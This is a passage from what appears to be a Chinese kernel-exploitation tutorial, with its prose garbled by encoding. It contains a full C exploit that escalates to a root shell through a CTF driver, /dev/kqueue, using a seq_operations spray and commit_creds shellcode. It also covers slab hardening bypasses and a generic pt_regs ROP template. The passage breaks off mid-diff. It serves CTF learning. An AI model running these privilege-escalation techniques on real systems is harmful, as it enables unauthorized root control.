class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">uint32_t</span>    max_entries;<br>    <span class="hljs-keyword">uint16_t</span>    data_size;<br>    <span class="hljs-keyword">uint16_t</span>    entry_idx;<br>    <span class="hljs-keyword">uint16_t</span>    queue_idx;<br>    <span class="hljs-keyword">char</span>*       data;<br>&#125;<span class="hljs-keyword">request_t</span>;<br><br><span class="hljs-keyword">long</span> dev_fd;<br><span class="hljs-keyword">size_t</span> root_rip;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">createQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> max_entries, <span class="hljs-keyword">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">editQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx,<span class="hljs-keyword">uint16_t</span> entry_idx,<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx,<span class="hljs-keyword">uint32_t</span> max_entries,<span class="hljs-keyword">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span>**envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span>        seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-keyword">size_t</span>      *page;<br>    <span class="hljs-keyword">size_t</span>      data[<span class="hljs-number">0x20</span>];<br><br>    saveStatus();<br>    root_rip = (<span class="hljs-keyword">size_t</span>) getRootShell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>        data[i] = (<span class="hljs-keyword">size_t</span>) shellcode;<br><br>    createQueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯ææƒåˆ° root</p><p><a href="https://i.loli.net/2021/11/02/oE6vb9nhT1rDwO7.png"><img src="https://s2.loli.net/2023/02/06/OHLtcG2QfYvMX7p.png" alt="image.png"></a></p><h2 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h2><p>off-by-one ç®—æ˜¯å †æº¢å‡ºé‡Œé¢æ¯”è¾ƒç‰¹æ®Šçš„ç±»å‹ï¼Œè¿™é‡Œç¬”è€…å…¶å®æ˜¯å°†è¿™ä¸€ç±»ä»…æº¢å‡ºå°‘æ•°å­—èŠ‚çš„å †æº¢å‡ºç»Ÿç§° off-by-oneï¼Œæº¢å‡ºçš„ä¸ä¸€å®šåªæ˜¯å•ä¸ªå­—èŠ‚ï¼Œä¸è¿‡æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯æº¢å‡ºä¸€ä¸¤ä¸ªå­—èŠ‚ï¼Œè‹¥æº¢å‡ºå•ä¸ª <code>\x00</code> å­—èŠ‚åˆ™ç§°ä¸º off-by-nullï¼ˆæ¯”å¦‚è¯´åœ¨æ‹·è´å­—ç¬¦ä¸²æ—¶å®¹æ˜“å‡ºç°è¿™ä¸ªé—®é¢˜ï¼‰</p><h3 id="ä¾‹é¢˜ï¼š0CTF2017-knote"><a href="#ä¾‹é¢˜ï¼š0CTF2017-knote" class="headerlink" title="ä¾‹é¢˜ï¼š0CTF2017 - knote"></a>ä¾‹é¢˜ï¼š0CTF2017 - knote</h3><blockquote><p>æ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹ CVE-2021-22555ï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå †ä¸Šçš„ off-by-nullçš„ æƒ…å†µï¼Œä½†æ˜¯ Google ç»™å‡ºçš„åˆ©ç”¨æ‰‹æ³•å¾ˆ  ğŸ‚ğŸº</p></blockquote><h2 id="Slab-Freelist-Hardened-bypass"><a href="#Slab-Freelist-Hardened-bypass" class="headerlink" title="Slab Freelist Hardened bypass"></a>Slab Freelist Hardened bypass</h2><p>ç±»ä¼¼äºç”¨æˆ·æ€ä¸‹ glibc ä¸­çš„ safe-linking æœºåˆ¶ï¼Œåœ¨å†…æ ¸ä¸­çš„ slab/slub åˆ†é…å™¨å½“ä¸­ä¹Ÿå­˜åœ¨ç€ç±»ä¼¼çš„æœºåˆ¶ä¿æŠ¤ç€ freelistâ€”â€” <code>SLAB_FREELIST_HARDENED</code>ï¼š</p><p>å¯¹äº freelist ä¸­å­˜å‚¨çš„ objectï¼Œå…¶ fd æ‰€å­˜å‚¨çš„å€¼ä¸º<strong>current object addr ä¸ next object addr ä¸ slub cookie</strong>è¿™ä¸‰ä¸ªå€¼<strong>å¼‚æˆ–</strong>æ‰€å¾—çš„å€¼ï¼Œè¿™è¦æ±‚æˆ‘ä»¬åœ¨æ„é€ ä»»æ„åœ°å€å†™æ—¶éœ€è¦åŒæ—¶çŸ¥é“è¿™ä¸‰ä¸ªå€¼æ‰èƒ½é€šè¿‡å†…æ ¸ä¸­çš„æ£€æµ‹</p><p>ä¸è¿‡ kmalloc å¹¶ä¸ä¼šæ¸…ç©º object ä¸Šæ•°æ®ï¼Œæˆ‘ä»¬ä»å¯ä»¥é€šè¿‡<strong>é‡åˆ†é…</strong>çš„æ–¹å¼ä» object ä¸Šæ®‹ç•™çš„ dirty data ä¸­è·å–åˆ° slub cookieï¼Œå†é€šè¿‡å…¶ä»–æ–¹å¼æ³„éœ²å†…æ ¸å †åœ°å€åä¾¿èƒ½é‡æ–°è¿›è¡Œä»»æ„åœ°å€å†™</p><p>åœ¨ç¼–è¯‘å†…æ ¸æ—¶åœ¨ <code>.config</code> ä¸­æ·»åŠ ç¼–è¯‘é€‰é¡¹ <code>CONFIG_SLAB_FREELIST_HARDENED=y</code> å³å¯å¼€å¯è¿™ç§åŠ å›ºæœºåˆ¶ï¼ˆç›®å‰æ–°ç‰ˆå†…æ ¸ä¼¼ä¹é»˜è®¤å¼€å¯ï¼‰</p><h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook-1"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook-1" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook</h3><blockquote><p>è¿™é¢˜è¦ç”¨åˆ° userfaultfdï¼Œæ”¾åé¢è®²</p></blockquote><h2 id="CONFIG-INIT-ON-ALLOC-DEFAULT-ON"><a href="#CONFIG-INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="CONFIG_INIT_ON_ALLOC_DEFAULT_ON"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h2><p>å½“ç¼–è¯‘å†…æ ¸æ—¶å¼€å¯äº†è¿™ä¸ªé€‰é¡¹æ—¶ï¼Œåœ¨å†…æ ¸è¿›è¡Œâ€œå †å†…å­˜â€åˆ†é…æ—¶ï¼ˆåŒ…æ‹¬ buddy system å’Œ slab allocatorï¼‰ï¼Œ<strong>ä¼šå°†è¢«åˆ†é…çš„å†…å­˜ä¸Šçš„å†…å®¹è¿›è¡Œæ¸…é›¶</strong>ï¼Œä»è€Œé˜²æ­¢äº†åˆ©ç”¨æœªåˆå§‹åŒ–å†…å­˜è¿›è¡Œæ•°æ®æ³„éœ²çš„æƒ…å†µ</p><p>æ®æ‚‰æ€§èƒ½æŸè€—åœ¨ <code>1%~7%</code> ä¹‹é—´</p><h1 id="ä¸¤å¥—ç»„åˆæ‹³"><a href="#ä¸¤å¥—ç»„åˆæ‹³" class="headerlink" title="ä¸¤å¥—ç»„åˆæ‹³"></a>ä¸¤å¥—ç»„åˆæ‹³</h1><p>åœ¨å­¦ä¹ äº†ä»¥ä¸Šå†…æ ¸åŸºæœ¬åˆ©ç”¨æŠ€å·§ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å‘ç° kernel pwn ä¸­çš„ä¸€äº›é€šç”¨ tricks ä¸é€šç”¨è§£æ³•</p><h2 id="pt-regs-æ„é€ é€šç”¨-kernel-ROPè§£æ³•-ï¼ˆmay-obsoleteï¼‰"><a href="#pt-regs-æ„é€ é€šç”¨-kernel-ROPè§£æ³•-ï¼ˆmay-obsoleteï¼‰" class="headerlink" title="_pt_regs æ„é€ é€šç”¨ kernel ROPè§£æ³•_ï¼ˆmay obsoleteï¼‰"></a>_pt_regs æ„é€ é€šç”¨ kernel ROPè§£æ³•_ï¼ˆmay obsoleteï¼‰</h2><h3 id="pre-å‰ç½®æ¡ä»¶"><a href="#pre-å‰ç½®æ¡ä»¶" class="headerlink" title="pre.å‰ç½®æ¡ä»¶"></a>pre.å‰ç½®æ¡ä»¶</h3><p>å¯ä»¥æ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼ˆåŠ«æŒè‡³å°‘ä¸€ä¸ªæŒ‡é’ˆï¼‰ï¼Œï¼ˆå¯é€‰ï¼‰å·²ç»æ³„éœ²å†…æ ¸åŸºå€</p><h3 id="ç³»ç»Ÿè°ƒç”¨-ä¸-pt-regs-ç»“æ„ä½“"><a href="#ç³»ç»Ÿè°ƒç”¨-ä¸-pt-regs-ç»“æ„ä½“" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ ä¸ pt_regs ç»“æ„ä½“"></a>ç³»ç»Ÿè°ƒç”¨ ä¸ pt_regs ç»“æ„ä½“</h3><p>ç³»ç»Ÿè°ƒç”¨çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿæˆ–è®¸ä¸å°‘äººéƒ½èƒ½å¤Ÿç­”å¾—ä¸Šæ¥æ˜¯ç”±æˆ‘ä»¬åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ç›¸åº”çš„å‚æ•°åæ‰§è¡Œ <code>syscall</code> è¿™ä¸€æ±‡ç¼–æŒ‡ä»¤ï¼Œé€šè¿‡é—¨ç»“æ„è¿›å…¥åˆ°å†…æ ¸ä¸­çš„ <code>entry_SYSCALL_64</code>è¿™ä¸€å‡½æ•°ï¼Œéšåé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¡¨è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°</p><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ° <code>entry_SYSCALL_64</code> è¿™ä¸€ç”¨æ±‡ç¼–å†™çš„å‡½æ•°å†…éƒ¨ï¼Œè§‚å¯Ÿï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°å…¶æœ‰ç€<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">è¿™æ ·ä¸€æ¡æŒ‡ä»¤</a>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASSEMBLY">PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br></code></pre></div></td></tr></table></figure><p>è¿™æ˜¯ä¸€æ¡ååˆ†æœ‰è¶£çš„æŒ‡ä»¤ï¼Œå®ƒä¼šå°†æ‰€æœ‰çš„å¯„å­˜å™¨<strong>å‹å…¥å†…æ ¸æ ˆä¸Šï¼Œå½¢æˆä¸€ä¸ª pt_regs ç»“æ„ä½“</strong>ï¼Œè¯¥ç»“æ„ä½“å®è´¨ä¸Šä½äºå†…æ ¸æ ˆåº•ï¼Œ<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">å®šä¹‰</a>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r15;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r14;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r13;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r12;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rbp;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r11;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r10;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r9;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r8;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rax;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rcx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rdx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rsi;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rip;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cs;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> eflags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rsp;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>åœ¨å†…æ ¸æ ˆä¸Šçš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><a href="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png"><img src="https://s2.loli.net/2023/02/06/L2vxtMQNVrw6Zm8.png" alt="image.png"></a></p><h3 id="å†…æ ¸æ ˆ-ä¸é€šç”¨-ROP"><a href="#å†…æ ¸æ ˆ-ä¸é€šç”¨-ROP" class="headerlink" title="å†…æ ¸æ ˆ ä¸é€šç”¨ ROP"></a>å†…æ ¸æ ˆ ä¸é€šç”¨ ROP</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå†…æ ¸æ ˆ<strong>åªæœ‰ä¸€ä¸ªé¡µé¢çš„å¤§å°</strong>ï¼Œè€Œ pt_regs ç»“æ„ä½“åˆ™å›ºå®šä½äº<strong>å†…æ ¸æ ˆæ ˆåº•</strong>ï¼Œå½“æˆ‘ä»¬åŠ«æŒå†…æ ¸ç»“æ„ä½“ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ—¶ï¼ˆä¾‹å¦‚ seq_operations-&gt;startï¼‰ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡è¯¥å‡½æ•°æŒ‡é’ˆåŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶ <strong>rsp ä¸ æ ˆåº•çš„ç›¸å¯¹åç§»é€šå¸¸æ˜¯ä¸å˜çš„</strong></p><p>è€Œåœ¨ç³»ç»Ÿè°ƒç”¨å½“ä¸­è¿‡ç¨‹æœ‰å¾ˆå¤šçš„å¯„å­˜å™¨å…¶å®æ˜¯ä¸ä¸€å®šèƒ½ç”¨ä¸Šçš„ï¼Œæ¯”å¦‚ r8 ~ r15ï¼Œ<strong>è¿™äº›å¯„å­˜å™¨ä¸ºæˆ‘ä»¬å¸ƒç½® ROP é“¾æä¾›äº†å¯èƒ½ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼š</strong></p><ul><li><strong>åªéœ€è¦å¯»æ‰¾åˆ°ä¸€æ¡å½¢å¦‚ â€œadd rsp, val ; retâ€ çš„ gadget ä¾¿èƒ½å¤Ÿå®Œæˆ ROP</strong></li></ul><p>è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„ ROP æ¿å­ï¼Œæ–¹ä¾¿è°ƒè¯•æ—¶è§‚å¯Ÿï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">__asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0x88888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="hljs-comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>);<br></code></pre></div></td></tr></table></figure><h3 id="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•"><a href="#æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•" class="headerlink" title="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•"></a>æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•</h3><p>æ­£æ‰€è°“é­”é«˜ä¸€å°ºé“é«˜ä¸€ä¸ˆï¼Œå†…æ ¸ä¸»çº¿åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">è¿™ä¸ª commit</a> ä¸­ä¸ºç³»ç»Ÿè°ƒç”¨æ ˆ<strong>æ·»åŠ äº†ä¸€ä¸ªåç§»å€¼ï¼Œè¿™æ„å‘³ç€ pt_regs ä¸æˆ‘ä»¬è§¦å‘åŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶çš„æ ˆé—´åç§»å€¼ä¸å†æ˜¯å›ºå®šå€¼</strong> </p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 